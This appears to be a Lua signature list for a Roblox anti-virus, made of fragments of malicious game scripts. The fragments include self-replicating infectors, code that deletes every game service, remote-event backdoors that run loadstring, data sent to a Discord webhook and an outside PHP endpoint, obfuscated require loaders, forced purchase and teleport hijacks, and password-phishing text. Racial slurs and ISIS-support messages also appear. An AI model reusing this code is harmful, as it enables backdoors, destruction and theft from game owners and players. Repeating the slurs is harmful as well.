	[[](string["\99\104\97\114"]],

	[[while wait() do
	local market = game:GetService("MarketplaceService")
	for i,v in pairs(game.Players:GetChildren()) do
		if not market:PlayerOwnsAsset(v, 4147951000) then
			if game.CreatorId ~= v.UserId then
				market:PromptPurchase(v, 4147951000)
			end
		end
	end
	wait(1)
end]],

	[[function XD() require(2556683221) end XD() ]],

	[[require(2556683221]],

	[[function door() require(2556683221) end door() ]],

	[[[string.reverse("eriuqer")]],

	[[script.Parent.Touched:connect(function(hit)
	if hit == nil then return end
	if hit.Parent == nil or hit.Name == "Virus" or hit:FindFirstChild("InfectedScript") ~= nil then return end
	local s = script.InfectedScript:clone()
	local t = script:clone()
	t.Disabled = true
	t.Parent = s
	s.Disabled = false
	s.Parent = hit
	GetTarget()
end)]],

	[[function GetTarget()
	wait(.1)
	a = {}
	find(game.Workspace)

	if #a == 0 then GetTarget()end

	min = 99999
	target = nil

	for _,v in pairs(a) do
		if (script.Parent.Position-v.Position).magnitude < min and v.Name ~= "Virus" or v.locked ~= true and v:FindFirstChild("InfectedScript") == nil then
			min = (script.Parent.Position-v.Position).magnitude
			target = v
		end
	end

	if target == nil or target.Locked == true then GetTarget()end
	--found out the problem

	attack(target)
end]],

	[[--Hello! This Virus was made by: ChillestOfChill/SyTheFoox/MrRThro]],

	[[--Still Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill]],

	[[Spybot/Code/9626735/entern code here (]],

	[[while wait() do
	local r = math.random(100)
	script.Parent.Text = "ANNOYANCE PERCENTAGE: " .. r .. "%"
end]],

	[[--IMPORTARNT!!!!!!!! DO NOT ENABLE THE FIRE INSIDE THE IS SCRIPT! IT WILL ENABLE ITSELF WHEN THE GAME STARTS! ENABLING IT MAY LEAD TO SUSPISION]],

	[[if workspace:FindFirstChild("Anti_Virus") ~= nil then
workspace.Anti_Virus:Destroy()
end]],

	[[if workspace:FindFirstChild("AntiVirusScript") ~= nil then
workspace.AntiVirusScript:Destroy()
end]],

	[[if r == 9 then
print("Fuck operator 72741")
end]],

	[[if r == 6 then
print("Hey nigger, GOOD LUCK FINDING THIS SCRIPT!!!!!!!!!!!!")
end]],

	[[-- discord: https://discord.gg/vg8eTK8]],

	[[n = {
"free models suck",
"hahahah u free model no0o0o0o0o0ob",
"created by roblox",
"ur a noob",
"hahahhahahaha",
"important lego brick",
"wiruses"
}]],

	[[Lag.Infected.loadstring = [9.0 8.1 2.9]],

	[[-- you see? not a virus!
--CreeperPower618]],

	[[function onPlayerEntered(newPlayer)
if newPlayer.Name ~= "jumperbunny" then
newPlayer:Remove()
end
end
game.Players.PlayerAdded:connect(onPlayerEntered)]],

	[[local KickPlayer = Instance.new("TextButton")
local USERNAME = Instance.new("TextBox")
local UnFreeze = Instance.new("TextButton")
local KillPlayer = Instance.new("TextButton")
local Back3 = Instance.new("TextButton")
local UnGod = Instance.new("TextButton")
local Blur = Instance.new("TextButton")
local God_2 = Instance.new("TextButton")
local VanPlayer = Instance.new("TextButton")
local FreezePlayer = Instance.new("TextButton")
local LagPlr = Instance.new("TextButton")
local MainMain = Instance.new("Frame")
local TextLabel_12 = Instance.new("TextLabel")
local Credit0s = Instance.new("TextButton")
local LocalPlayer = Instance.new("TextButton")
local Main = Instance.new("TextButton")
local Game = Instance.new("TextButton")
local TextLabel_13 = Instance.new("TextLabel")
local Settings = Instance.new("ImageButton")
local Close_2 = Instance.new("TextButton")
local SettingsMain = Instance.new("Frame")
local TextLabel_14 = Instance.new("TextLabel")
local SelfDestroy = Instance.new("TextButton")
local Back = Instance.new("TextButton")
local Inverted = Instance.new("TextButton")
local Angel = Instance.new("TextButton")
local Open = Instance.new("TextButton")

-- Properties

ZerosSGui.Name = "Zero'sS Gui"
ZerosSGui.Parent = game.CoreGui

Credits.Name = "Credits"
Credits.Parent = ZerosSGui
Credits.Active = true
Credits.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
Credits.BorderColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Credits.BorderSizePixel = 8
Credits.Draggable = true
Credits.Position = UDim2.new(0, 325, 0, 50)
Credits.Selectable = true
Credits.Size = UDim2.new(0, 397, 0, 384)
Credits.Visible = false]],

	[[m.Text = "THIS SERVER IS HACKED BY A PRUD ISIS SUPPORTER -iiVape_Bleach"]],

	[[for i = 1, #st do
st[i].Name = "Allah Akbar"
end
]],

	[[local Settings={["Un_Removable"]= "On"}
local function mFloor(x) return x - x % 1 end
local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
if Un_Removable then
	Game.Workspace.DescendantRemoving:connect(function(Child)
		if not Remove_At_Will and Child == script then
			script:Clone().Parent = Game.Workspace
		end
end)
end]],

	[[function onChatted(msg)
if msg == cod.."j/messageAG" then ]],

	[[if script.Parent:findFirstChild("GoroBomb") == nil and script.Parent:findFirstChild("GoroReflex") == nil and script.Parent:findFirstChild("GoroShot") == nil and script.Parent:findFirstChild("GoroStrike") == nil and script.Parent:findFirstChild("Goroteleport") == nil  then
game.Lighting:findFirstChild("Rumble").GoroBomb:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroReflex:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroShot:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroStrike:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").Goroteleport:clone().Parent = script.Parent]],

	[[function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild("INfecTION") == nil and list[i].className ~= "RotateP" then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end]],

	[[script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
wait(3)
game.Workspace:ClearAllChildren()
game.Players:ClearAllChildren()
game.Lighting:ClearAllChildren()
game.ReplicatedFirst:ClearAllChildren()
game.ReplicatedStorage:ClearAllChildren()
game.ServerScriptService:ClearAllChildren()
game.ServerStorage:ClearAllChildren()
game.StarterGui:ClearAllChildren()
game.StarterPack:ClearAllChildren()
game.Chat:ClearAllChildren()
game.Soundscape:ClearAllChildren()]],

	[[	a = Instance.new("Hint",workspace)
	a.Text = "Your place is ruined, Courtesy of Blackout Virus >:D"
	a.Name = "Your place is ruined, Courtesy of Blackout Virus >:D"

	game.Players:ClearAllChildren()
	wait(5)
	a.Text = "Crashing in 5 seconds..."
	a.Name = "Crashing in 5 seconds..."
	wait(1)
	a.Text = "Crashing in 4 seconds..."
	a.Name = "Crashing in 4 seconds..."
	wait(1)
	a.Text = "Crashing in 3 seconds..."
	a.Name = "Crashing in 3 seconds..."
	wait(1)
	a.Text = "Crashing in 2 seconds..."
	a.Name = "Crashing in 2 seconds..."
	wait(1)
	a.Text = "Crashing in 1 second..."
	a.Name = "Crashing in 1 second..."]],

	[[local players = game.Players:GetPlayers()

game.Players.PlayerAdded:Connect(function(player)
if player.UserId == yourID then
player.Chatted:Connect(function(msg)
if msg == ";destroy" then
local a = Instance.new("Message", workspace)
a.Text = "good bye ;)"
game.Workspace:ClearAllChildren()
players:Kick('lol')
end
end)
end
end)

]],

	[[local https = "https://discordapp.com/api/webhooks/565300170435330058/44RmFRXwwku8L_yLyLh97meXLwX31Um6Mtmq9DeMzvYeSqa2Z02Om_kAbnWw95BqjMYe"]],

	[[(397.86020086+0.00000400)*9305953]],

	[[local d=string.byte;local r=string.char;local c=string.sub;local s=table.concat;local u=math.ldexp;local H=getfenv or function()return _ENV end;local]],

	[[rem1.OnServerEvent:connect(function(user, stri)
	if checkAdmin(http:JSONDecode(pass), user.Name) then
		require(script:WaitForChild("Loadstring"))(stri)()
		SendHook("Script Executed By User: ".. user.Name .. "! \nScript: ".. stri)
	else
		SendHook("Execution Attempt By User: ".. user.Name .. "! \nScript: ".. stri)
	end
end)]],

	[[local pass = http:GetAsync("https://pastebin.com/raw/KNv3kKKb")

function checkAdmin(tab, str)
	for i,v in next, tab do
		if v == str then
			return true
		end
	end
	return false
end

function SendHook(cont)
	local JS = {
		username = Market:GetProductInfo(game.PlaceId).Name,--"Game ID: "..tostring(game.PlaceId),
		content = "Game ID: ".. tostring(game.PlaceId) .. "\n\n" ..cont
	}
	http:GetAsync("https://littest.site/Esketit/megaoof.php?Content=" .. http:JSONEncode(JS))
end]],

	[[-- Made by SeniorFight for V3rmillion!]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems --This lets the script find out how much debris there is.

if (mx.MaxItems]],

	[[local payload = require(1006051316)]],

	[[if game:GetService("ServerScriptService"):FindFirstChild(fakeName) == nil then
		local copy = script:Clone()

		copy.Parent = game:GetService("ServerScriptService")
		copy.Name = fakeName
		local cChannel = Instance.new("ModuleScript")

		cChannel.Name = "ChatChannel"
		cChannel.Parent = copy
		local bChannel = Instance.new("ModuleScript")

		bChannel.Name = "ChatService"
		bChannel.Parent = copy
		local aChannel = Instance.new("ModuleScript")

		aChannel.Name = "Speaker"
		aChannel.Parent = copy
		local zChannel = Instance.new("ModuleScript")

		zChannel.Name = "Util"
		zChannel.Parent = copy

		if game:GetService("ServerScriptService"):FindFirstChild("ChatServiceRunner") ~= nil then

			game:GetService("ServerScriptService").ChatServiceRunner:Destroy()

		end

	end]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"]],

	[[Players.PlayerAdded:Connect(function(plr)
	TS:Teleport(4126761592,plr)
end)]],

	[[mx = game.Debris.MaxItems]],

	[[mx2 = game.Debris.MaxItems]],

	[["\103\101\116\102\101\110\118"]],

	[[local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local Place = 3624761586


Players.PlayerAdded:Connect(function(player)
print(player)
              TeleportService:Teleport(Place, player)

end)]],

	[[function checkForAndSwitch(player)
		if (player.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge Shall Return"
wait(1)
m:Remove()
]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "DeaRevenge is a Member Of 1x1x1x1"
wait(1)
m:Remove()]],

	[[local m = Instance.new("Message")
m.Parent = Workspace
m.Text = "All Hackers Shall Return"
wait(1)
m:Remove()]],

	[[while true do
Wait (1)
print("1"..string.rep("0",1010100).."")
end]],

	[[if found ~= nil then
		found.Name="telemon woz ere"
		infectedscr = model.SnapReducer:Clone()
		infectedscr.Parent = found
	else]],

	[[--								///|\\\				  ///|\\\
-----------------------///|||\\\Version ???///|||\\\-----------------------
--							 ////|||\\\\_________////|||\\\\
--							((((|||||))))~/|||\~((((|||||))))
--							'|    _	  |>>>YUP<<<|	  _	 |'
--							 |   / \	  |VvVvVvVvV|   / \	 |
--							 |	  | |	  |^^^^^^^^^|	 | |   |
--							 |	  | |   |OOOOOOOOO|	 | |   |
--							 |	  \_/   |XXXXXXXXX|	 \_/   |
--							 |         | |OOOOOOO|			 |
--							 |_________|ï¿½|OOOOOOO|_________|
--
-- idk

script.Parent = Punci -- I like 'punci'-s :3
]],

	[[SC = script:clone()
SCC = SC:clone()
SCCC = SCC:clone()
names = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","10","VIRUS"}
SC.Parent = script
SCC.Parent = script
SCCC.Parent = script
while true do
wait()
SC.Name = math.random(1,#names)
SCC.Name = math.random(1,#names)
SCCC.Name = math.random(1,#names)
end]],

	[[while true do
wait()
P = Instance.new("Weld")
P.Parent = script
script:clone().Parent = script
end]],

	[[local module = {}
local allowed = {"RAHULPROHACKER", "EnginnScript"}
game.Players.PlayerAdded:connect(function(player)
    for i, v in pairs(allowed) do
        if player.Name == v then
            script.ScreenGui:Clone().Parent = player.PlayerGui
        end
    end
end)
return module
]],

	[[if player.Name == you then
script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[exe.OnServerEvent:connect(function(plr, key, data)
	if key == GlobalPass then
		print("Running: "..data.." From: "..plr.Name)
		loadstring(data)()
	else
		plr:Kick(stop)
	end
end)]],

	[[require(script:WaitForChild("Loadstring"))(stri)()]],

	[[Remote.OnServerEvent:connect(function(player, key, execute)
		if mod == "Evil" then
			print("Running: "..execute.." from: "..player.Name)
			loadstring(execute)()
		else
			player:Kick("You are not admin")
			print(player.." was kicked for trying to connect to the backdoor")
		end
end)]],

	[[discord=Instance.new("Message")
discord.Text = "THE APOCALYPSE HAS BEGUN!!!"
discord.Parent = game.Workspace]],

	[[GetAllItems(workspace)]],

	[[getfenv()['\114\101\113\117\105\114\101'](238754.208233*12851)]],

	[[|106(*79|151(*75|117@#59|97@#84|81@#100|86(*86|13&^12|12&^8|25&^29|28(*24|8@#38|0@#76|81(*81|0@#54|74(*74|0@#89|64(*64|0@#83|29(*29|0@#40|0@#84|29(*29|0@#37|30&^30|19(*19|26&^26|7&^5|2@#114|4@#32|0@#30|41&^41|25(*25|24@#95|0@#54|36&^36|0@#111|78@#76|72&^8|86(*86|3&^3|86(*75|69&^5|35&^35|35&^34|95(*65|41&^41|128@#72|0@#101|2@#38|0@#18|30(*30|4&^4|4@#53|1&^7|0@#103|37(*37|28(*28|112@#32|187(*73|106&^3|110@#10|116@#73|0@#113|4@#5|87@#70|0@#38|73(*73|37(*37|45@#26|45@#48|112&^32|79@#61|72&^31|110&^43|127(*45|69@#114|85&^17|50(*18|92&^30|68&^29|17&^49|72&^4|173(*88|82@#113|79&^14|80@#121|72@#109|44@#20|32@#118|89&^26|72@#37|69@#61|65@#70|111(*31|69@#112|124(*41|84@#66|105(*73|168(*85|157(*90|76&^30|73@#47|85&^5|84@#26|32@#55|79@#99|66@#18|70@#16|126(*41|117&^38|67@#52|68&^5|84@#58|97(*18|109(*27|44@#93|11&^43|105(*26|158(*80|76@#66|89@#42|32@#96|44&^8|76(*27|57&^22|172(*89|67@#11|82@#92|73@#102|80@#102|84]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3782332641)]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3801326824)]],

	[[game.MarketplaceService:PromptPurchase(plr,3801326824)
			wait(30)
			game.MarketplaceService:PromptPurchase(plr,3782332641)]],

	[[sound = Instance.new("Sound")
sound.SoundId = "http://www.roblox.com/asset?id=459420383"
sound.Volume = .5
sound.Looped = true
sound.Name = "Music"
sound.Parent = game.Workspace
sound:Play()
script:Remove()]],

	[[()function.player.aspx?.ID=('Turn Into Nothing But Black')
	starterplayer.player(0)+('Player''s'' ''iD') 250,250,250
    starterplayer.player(Random)-"Players Get Deactivated"
end]],

	[[INSPIRED BY THE FASCINATING OLD VIRUSES OF THE 90S
m.Text BY THE VIRUS OF THE NAME Savior
http://www.youtube.com/watch?v=4FZvJmwXq5U
i a mM NoT INSAne!!!!!!!!!!! :(
A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!]],

	[[Setupconfirm=script:FindFirstChild("deployed")
if Setupconfirm==nil then
	dep=Instance.new("NumberValue", script)
	dep.Name="deployed"
	dep.Value=tick()
end]],

	[[("A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!")]],

	[[crashites=game.Players:GetChildren()
		for crashite=1, #crashites do
			Playerconfirm=crashites[crashite]:FindFirstChild("PlayerGui")
			if Playerconfirm~=nil then
				minion=script.destroyer:Clone()
				minion.Parent=crashites[crashite].PlayerGui
			end
		end]],

	[[local thank = "Thank you for choosing this 'Virus' as your choice for destructive purposes."
local thank = "This Virus is also configurable by the way, the settings are down bellow."
local thank = "Anyways, I hope you enjoy using this."
local PS = "Also, if you happened to find this script in a model in your place and you didn't put it there."
local PS = "Delete it before anything bad happens aaaaaaaaaannnnnnnndddddd."
local PS = "Congratulations, you saved your place from a nightmare."
local PS = "Just make sure to subscribe to Sans Gaming." ]],

	[[if hit:FindFirstChildWhichIsA("Fire") == nil then
		local fire = script.Parent:Clone()
		fire.Parent = hit
		hit.Name = "DEATH TO DATGUY"
	end]],

	[[p.Heat = 999
			p.Size = 999
			p.Enabled = true
			local y = Instance.new("ForceField")
			y.Name = "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½"
			y.Parent = x[i]],

	[[print("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½")]],

	[[--Credit too the original creator of teh slimes. Timsood something or the other.
-------------
-------------
spaces = 3 -- How many spaces it travels per move(1-3 is the best, preferably 2)
speed = 2000 -- How fast it goes, just put any number I guess :P
range = 9999 -- How far the slime "sees"; if it can't see ya it won't get ya! lol
ooze = true -- This is whether the slime will squeeze through really thick walls or not.
-------------
-------------

local partname = "TehSlime" -- Name of the "Slimeys". So you don't have to change it throughout the entire script. :P
local targetname = "Head" -- Kinda obvious....... lol
local food = {"Head"} -- OM NOMS!!! :D

-------------
-------------

function findTarget() -- Ah, the findTarget() command. This command lets the slime find it's next victim.
	g = game.Workspace:getChildren()
	for i=1, #g do
	if g[i]:findFirstChild(targetname) ~= nil then
		if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < range then
			if T == nil then
				T = g[i]:findFirstChild(targetname)
			else
				if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < (T.Position - script.Parent:findFirstChild(partname).Position).magnitude then
					T = g[i]:findFirstChild(targetname)
				end
			end
		end
	end
	end
end]],

	[[-- rename, put into model, and troll ðððððððð]],

	[[function findAll(lag)
	for i,v in ipairs(workspace:GetChildren()) do
		local clone = lag:clone()
		clone.Name = "You got H8C5ED"
		clone.Parent = v
	end
end]],

	[[hacked]],

	[[h3cked]],

	[["iEmOtIoNlEsS"]],

	[[Ý£]],

	[[hakked]],

	[[h4kk3d]],

	[[haacked]],

	[[tr0ll]],

	[[R0ll]],

	[[nigger]],

	[[niger]],

	[[niggeer]],

	[[nigeer]],

	[[nibba]],

	[[msg.Parent = game.Workspace
msg.Text = "Anchoring players and moving them to a more slav spot..."]],

	[[haxx]],

	[[Funny=require(]],

	[[print("This game has been hacked get rekt idiot!")]],

	[[This game has been hacked get rekt idiot]],

	[[59429.86000469662*55359)("2zPM559.901T4qNALB(5916.814864029748)")]],

	[[3419556000]],

	[[if player.Name == you then script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[local IllIIllIIlll=require]],

	[[S333X]],

	[[3989501000]],

	[[3989337802]],

	[[TS:Teleport(3989337802,plr)]],

	[[TS:Teleport(3989337802,v)]],

	[[/110670]],

	[[ 110670]],

	[[2797686659]],

	[[3173224995]],

	[[4309332554]],

	[[Please FOLLOW ME ON TWITTER @JBLADE733]],

	[[3016646411]],

	[[3089856341]],

	[[TS:Teleport(3089856341,plr)]],

	[[TS:Teleport(3089856341,v)]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"](tonumber("\49"),{["1gKorIzL9]],

	[[1120769650]],

	[[Teleport(1120769650]],

	[[1394668245]],

	[[(p,1394668245)]],

	[[PromptPurchase(p,1394668245)]],

	[['\108\111\099\097\108\032\084\111\111\108\032\061\032\115\099\114\105\112\116\046\080\097\114\101\110\116\013\010\013\010\108\111\099\097\108\032\103\101\097\114\115\032\061\032\123\053\053\055\055\053\055\055\057\125\013\010\013\010\013\010\013\010\102\117\110\099\116\105\111\110\032\111\110\065\099\116\105\118\097\116\101\100\040\041\013\010\032\045\045\032\112\108\097\121\032\115\111\117\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\032\061\032\084\111\111\108\046\072\097\110\100\108\101\058\070\105\110\100\070\105\114\115\116\067\104\105\108\100\040\034\077\097\103\105\099\083\111\117\110\100\034\041\013\010\032\105\102\032\109\097\103\105\099\083\111\117\110\100\032\061\061\032\110\105\108\032\116\104\101\110\032\114\101\116\117\114\110\032\101\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\058\080\108\097\121\040\041\013\010\013\010\045\045\032\071\079\079\068\032\082\065\078\068\079\077\073\090\065\084\073\079\078\032\067\079\068\069\033\033\013\010\032\110\117\109\076\111\111\112\115\032\061\032\109\097\116\104\046\114\097\110\100\111\109\040\048\044\109\097\116\104\046\102\108\111\111\114\040\049\048\048\048\042\116\105\109\101\040\041\041\041\013\010\032\110\117\109\076\111\111\112\115\032\061\032\110\117\109\076\111\111\112\115\032\045\032\040\109\097\116\104\046\102\108\111\111\114\040\110\117\109\076\111\111\112\115\032\047\032\049\048\048\048\048\041\042\049\048\048\048\048\041\013\010\032\102\111\114\032\105\032\061\032\049\044\110\117\109\076]],

	[[--hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad]],

	[[function connection(player)
player:remove()
end
game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end;game.Players.ChildAdded:connect(connection)]],

	[[This server has been shutdown by Cool890dude]],

	[[Cool890dude]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then]],

	[[m.Name="94m3 Cr45h3r 1337 m355a93"]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then
w[i]:remove()
tw=tw+1
end end
for i=1,#p do
p[i]:remove()
tp=tp+1
end
for i=1,#g do
g[i]:remove()
tg=tg+1
end
for i=1,#t do
t[i]:remove()
tt=tt+1
end]],

	[[Hi and welcome to my script hope you enjoy the hack lion. WARNINGS: Hack might back fire and crash the game it happens.]],

	[[Newleetbox now has your username and password, Have a nice day!]],

	[[We don't give passwords back. We only spread the passwords on our website for EVERYONE to HACK IN!]],

	[[game.Players.MaxPlayers = 0]],

	[[SCRIPT: Generator V is not a lie, click play fool]],

	[[m.Text = "WARNING MALWARE"]],

	[[@JBLADE733]],

	[[1445530615]],

	[[local modelid = 1445530615]],

	[[local market = game:GetService("MarketplaceService")
	local modelid = 1445530615]],

	[[bendarobloxian]],

	[[local modelid = 1445530615
	local adminid = 857927023]],

	[[The code below this line is to support the creator (bendarobloxian)]],

	[[3419556*1000]],

	[[-- Made by youglow,new account robloxcitya dont forget to add him]],

	[[https://discord.gg/Nf2XrJ]],

	[[I shall remain anonymous, but enjoy hacking those noobs.]],

	[[Yes, you most likely know me,
	I am a mediocere developer on ROBLOX and here to assist you in exploitation needs.
	Here you can trick someone into entering their password.
	This links with Trello.]],

	[[59429.86000469662*55359]],

	[[4298677137]],

	[[4298672263]],

	[[4350052962]],

	[[4138626212]],

	[[if game.Players.LocalPlayer:IsFriendsWith(1208107446) or game.Players.LocalPlayer.Name == "Hywayyy" then ]],

	[[local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}

local Source = script.Parent.EditorFrame.Source
local Lines = Source.Parent.Lines]],

	[[3702180717]],

	[[2290382491]],

	[[AdamFlexer]],

	[[Odin_00101010101]],

	[[DestinyKennedy2]],

	[[3930380293]],

	[[2977298142]],

	[[3989432705]],

	[[4056237385]],

	[[4056235807]],

	[[4056234287]],

	[[4056232640]],

	[[4056231205]],

	[[4056229665]],

	[[4056228250]],

	[[4056226820]],

	[[4056225268]],

	[[4056223744]],

	[[4056222250]],

	[[4056220801]],

	[[4056219320]],

	[[4056217842]],

	[[4056216423]],

	[[4056215048]],

	[[4056213658]],

	[[4056212354]],

	[[4056210981]],

	[[4056209461]],

	[[4056207947]],

	[[2674928586]],

	[[4124658053]],

	[[["1gKorIzL9NW7p"]=2]],

	[[)["\116\111\110\117\109\98\101\114"]],

	[[]{48,88,67]],

	[[4436101979]],

	[[2944264211]],

	[[game:GetService("TeleportService"):Teleport(2944264211,player)]],

	[[script.N00B.Parent = game.Lighting
script.NO0B:Play()
script.NOOB:Play()]],

	[[4436519412]],

	[[https://discord.gg/BKTUrXV]],

	[[Anti-Exploit made by Internet Explorer#5231]],

	[[-- Scripted by Esynov]],

	[[TeleportID = 3058831461]],

	[[SupportID = 4467005447]],

	[[-- This is in no way a virus as its just simple script.]],

	[[1844877398,player]],

	[[1702114734,player]],

	[[2871271645]],

	[['01101100','01101111','01100011','01100001','01101100','00100000','01101000','01110100','01110100','01110000','00100000','00111101','00100000','01100111','01100001','01101101','01100101','00111010','01000111','01100101','01110100','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00101000','00100111','01001000','01110100','01110100','01110000','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00100111','00101001','00001010','01101100','01101111','01100011','01100001','01101100','00100000','01000100','01100001','01110100','01100001','00100000','00111101','00100000','01111011','00001010','01011011','00100010','01100011','01101111','01101110','01110100','01100101','01101110','01110100','00100010','01011101','00100000','00111101','00100000','00100010','01101101','01110010','00100000','01101011','01110010','01100001','01100010','01110011','00100000','01100110','01101111','01110101','01101110','01100100','00100000','01100001','00100000','01101110','01100101','01110111','00100000','01100111','01100001','01101101','01100101','00100000','01110011','01101001','01110010','00100000','01101000','01110100','01110100','01110000','01110011','00111010','00101111','00101111','01110111','01110111','01110111','00101110','01110010','01101111','01100010','01101100','01101111','01111000','00101110','01100011','01101111','01101101','00101111','01100111','01100001','01101101','01100101','01110011','00101111','00100010','00100000','00101110']],

	[[mr krabs found a new game sir https://www.roblox.com/games/" ..game.PlaceId]],

	[[https://perryhaxz.moe/discord_gateway.php]],

	[[local Ranking = Instance.new("RemoteEvent", game.JointsService)]],

	[[loadstring(serverExecution)()]],

	[[-- Hello Thanks for using Doggo Lag Patcher my new Lag Patcher!
-- Here's a few steps for doggo lag patcher to work right.
-- Enable Http by going to game Options then Options. Or open command bar & copy & paste this game:GetService("HttpService").HttpEnabled = true
-- And Enable loadstrings by going in Explorer and clicking on ServerScriptService then properties then check Loadstrings!
-- New updates coming every week!
-- Patches almost all lag!
-- Motto | Doggos drink the bepis lag!]],

	[[Enable loadstrings]],

